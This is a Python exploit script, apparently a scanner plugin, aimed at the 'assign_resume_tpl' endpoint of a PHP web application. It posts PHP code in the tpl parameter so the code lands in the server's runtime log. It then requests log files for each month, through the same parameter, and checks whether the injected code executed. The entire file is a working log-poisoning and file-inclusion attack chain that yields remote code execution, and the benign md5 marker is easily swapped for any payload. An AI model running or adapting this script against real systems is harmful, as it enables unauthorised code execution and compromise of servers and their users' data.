import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=str(randomInt(1000, 2000))
def substr(strs,s,lens):
	result=strs[s:s+lens]
	return result
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=%3C%3Fphp+echo+md5("+f1+")%3B+ob_flush%28%29%3B%3F%3E"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 404:
		r1=True
		try:
			day=re.findall(",\\s+(\\d*)\\s+",response.headers["Date"])[0]
		except:
			day=''
		try:
			year=re.findall("\\s+(.{4})\\s+",response.headers["Date"])[0]
			year=substr(year,2,2)
		except:
			year=''
	else:
		r1=False
		day=''
		year=''
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_01_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q1=True
	else:
		q1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_02_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q2=True
	else:
		q2=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_03_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q3=True
	else:
		q3=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_04_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q4=True
	else:
		q4=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_05_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q5=True
	else:
		q5=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_06_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q6=True
	else:
		q6=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_07_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q7=True
	else:
		q7=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_08_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q8=True
	else:
		q8=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_09_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q9=True
	else:
		q9=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_10_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q10=True
	else:
		q10=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_11_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q11=True
	else:
		q11=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=home&a=assign_resume_tpl"
	body=f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_12_{day}.log"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		q12=True
	else:
		q12=False
	if r1 and (q1 or q2 or q3 or q4 or q5 or q6 or q7 or q8 or q9 or q10 or q11 or q12):
		return True
	else:
		return False
